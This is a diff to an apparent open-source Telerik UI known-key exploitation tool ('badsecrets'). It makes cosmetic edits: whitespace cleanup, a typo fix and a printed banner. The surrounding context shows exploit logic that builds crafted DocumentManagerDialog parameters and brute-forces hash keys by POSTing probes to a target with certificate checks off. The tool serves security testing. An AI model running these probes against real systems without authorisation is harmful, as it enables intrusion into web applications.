@@ -52,7 +52,6 @@ telerik_versions = [
 def probe_version(
     url, hash_key, encryption_key, version, key_derive_mode, telerik_hashkey, telerik_encryptionkey, proxies
 ):
-
     b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version={version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
     b64section = base64.b64encode(b64section_plain.encode()).decode()
     plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,False"
@@ -90,7 +89,7 @@ def main():
     parser.add_argument(
         "-p",
         "--proxy",
-        help="Optionally specificy an HTTP proxy",
+        help="Optionally specify an HTTP proxy",
     )
 
     parser.add_argument(
@@ -159,10 +158,8 @@ def main():
 
     # PBKDF1_MS MODE
     if key_derive_mode == "PBKDF1_MS":
-
         hashkey_counter = 0
         for hash_key_probe, hash_key in x.hashkey_probe_generator(include_machinekeys=include_machinekeys_bool):
-
             hashkey_counter += 1
             data = {"dialogParametersHolder": hash_key_probe}
             res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)
@@ -265,4 +262,7 @@ def main():
 
 
 if __name__ == "__main__":
+    print("badsecrets - Telerik UI known key exploitation tool\n")
+    print("Black Lantern Security - https://www.blacklanternsecurity.com")
+    print("@paulmmueller\n")
     main()
